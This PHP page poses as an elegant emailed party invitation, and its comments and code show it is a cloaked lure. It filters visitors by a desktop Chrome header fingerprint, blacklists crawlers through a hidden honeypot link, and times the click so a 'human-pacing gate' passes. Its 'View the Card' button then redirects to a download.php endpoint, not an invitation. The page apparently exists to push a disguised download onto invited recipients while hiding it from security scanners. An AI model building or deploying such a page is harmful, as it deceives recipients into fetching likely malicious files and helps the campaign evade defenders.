<?php
require __DIR__ . '/../lib.php';

// Entry page: real desktop Chrome only (full header fingerprint + honeypot).
// Cross-site arrivals from the mail client (Gmail/Yahoo/Outlook embed) are
// accepted by chrome_headers_ok() — this is a B2B invitation sent from any
// inbox, so mail-client arrivals must render, not 404.
gate_doc([], 0, false);

$tk = issue_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="robots" content="noindex, nofollow">
  <title>You've Been Invited</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400;1,500&family=Jost:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body { height:100%; background:#131315; color:#efe9df;
      font-family:'Jost',sans-serif; -webkit-font-smoothing:antialiased; }
    body { display:flex; flex-direction:column; align-items:center;
      justify-content:center; text-align:center; padding:44px 24px; }
    .frame { position:relative; max-width:540px; width:100%; padding:58px 40px 50px 40px; }
    .frame:before { content:''; position:absolute; inset:14px;
      border:1px solid rgba(239,233,223,.18); pointer-events:none; }
    .frame:after { content:''; position:absolute; inset:18px;
      border:1px solid rgba(239,233,223,.08); pointer-events:none; }
    .orn { width:58px; height:58px; margin:0 auto 30px auto; opacity:.92; }
    .eyebrow { font-size:11px; letter-spacing:6px; text-transform:uppercase;
      color:rgba(239,233,223,.55); margin-bottom:30px; }
    .letter { font-family:'Cormorant Garamond',serif; font-size:27px;
      line-height:1.55; font-weight:400; color:#efe9df; }
    .letter em { font-style:italic; color:#f4efe6; }
    .btn { display:inline-block; margin-top:46px; padding:14px 42px;
      border:1px solid rgba(239,233,223,.55); color:#efe9df; font-size:12px;
      letter-spacing:5px; text-transform:uppercase; text-decoration:none;
      cursor:pointer; transition:background .3s, border-color .3s; background:transparent; }
    .btn:hover { background:rgba(239,233,223,.08); border-color:#efe9df; }
    .title { margin-top:54px; font-family:'Cormorant Garamond',serif;
      font-size:31px; letter-spacing:7px; text-transform:uppercase;
      font-weight:500; color:#efe9df; }
    .sub { margin-top:12px; font-size:11px; letter-spacing:3.5px;
      text-transform:uppercase; color:rgba(239,233,223,.45); }
    .loader { position:fixed; inset:0; background:#131315; display:none;
      align-items:center; justify-content:center; flex-direction:column;
      gap:20px; z-index:50; }
    .loader .spin { width:34px; height:34px; border:2px solid rgba(239,233,223,.18);
      border-top-color:#efe9df; border-radius:50%; animation:sp .8s linear infinite; }
    @keyframes sp { to { transform:rotate(360deg); } }
    .loader .lt { font-size:12px; letter-spacing:4px; text-transform:uppercase;
      color:rgba(239,233,223,.6); }
  </style>
</head>
<body>
  <div class="frame">
    <svg class="orn" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="7" y="16" width="50" height="32" rx="2" stroke="rgba(239,233,223,.75)" stroke-width="1.4"/>
      <path d="M8 19 L32 37 L56 19" stroke="rgba(239,233,223,.75)" stroke-width="1.4" fill="none"/>
    </svg>
    <div class="eyebrow">You&rsquo;ve Been Invited</div>
    <div class="letter">Work, life, and everything in between&mdash;we&rsquo;re bringing all our
      favorite people together under one roof. <em>We&rsquo;d love for you to be
      part of the mix!</em></div>
    <a class="btn" id="view" href="#">View the Card</a>
    <div class="title">Cocktails &amp; Conversation</div>
    <div class="sub">An Evening to Remember</div>
  </div>

  <!-- Honeypot: invisible to humans, followed by link-crawling bots.
       A visit to ?hp=1 poisons that IP+UA fingerprint for 24h. -->
  <a href="?hp=1" aria-hidden="true"
     style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;overflow:hidden;white-space:nowrap;">Skip verification</a>

  <div class="loader" id="loader"><div class="spin"></div><div class="lt">Opening your invitation&hellip;</div></div>

  <script>
    const TK = <?php echo json_encode($tk); ?>;
    const loadT = Date.now();
    // Click "View the Card" -> brief themed loader -> the event card. The wait
    // is floored so the referer + human-pacing gate on the next step is always
    // comfortably satisfied (even if a guest clicks fast).
    document.getElementById('view').addEventListener('click', function (e) {
      e.preventDefault();
      var elapsed = Date.now() - loadT;
      var wait = Math.max(1300, 4600 - elapsed);
      document.getElementById('loader').style.display = 'flex';
      setTimeout(function () {
        window.location.href = "download.php?tk=" + encodeURIComponent(TK);
      }, wait);
    });
  </script>
</body>
</html>
